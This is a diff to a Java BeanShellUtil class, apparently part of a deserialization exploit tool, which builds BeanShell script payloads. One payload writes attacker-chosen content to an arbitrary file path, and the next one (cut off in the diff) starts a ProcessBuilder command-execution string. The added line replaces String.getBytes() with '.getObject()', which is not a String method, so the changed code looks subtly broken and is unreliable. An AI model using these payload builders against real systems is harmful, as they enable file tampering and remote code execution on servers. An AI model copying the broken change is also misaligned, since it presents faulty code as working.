@@ -16,7 +16,7 @@ public class BeanShellUtil {
         }
         if (command.startsWith("WF-")) {
             String[] strings = Utils.handlerCommand(command);
-            return "compare(Object nu1r, Object su19) { return new Integer(1);}new java.io.FileOutputStream(\"" + strings[0] + "\").write(\"" + strings[1] + "\".getBytes());";
+            return "compare(Object nu1r, Object su19) { return new Integer(1);}new java.io.FileOutputStream(\"" + strings[0] + "\").write(\"" + strings[1] + "\".getObject());";
         }
 
         return "compare(Object nu1r, Object su19) {new java.lang.ProcessBuilder(new String[]{" +
